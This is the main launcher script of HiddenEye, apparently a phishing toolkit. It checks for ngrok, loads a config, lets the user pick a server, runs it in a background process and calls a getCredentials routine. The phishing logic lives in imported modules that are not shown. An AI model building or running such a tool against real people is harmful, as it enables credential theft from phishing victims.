#!/usr/bin/python3
#HiddenEye by Open Source Community
import multiprocessing
import gettext
from gettext import gettext as _
from Defs.Checks import *
from Defs.Configurations import *
from Defs.Actions import *


RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

checkConnection()
checkNgrok()

ifSettingsNotExists()
readConfig()
config = readConfig()


if __name__ == "__main__":
    try:
        runMainMenu()

        inputCustom()
        ##############
        selectServer()

        multiprocessing.Process(target=runServer).start()
        getCredentials()

    except KeyboardInterrupt:
        endMessage()
        exit(0)
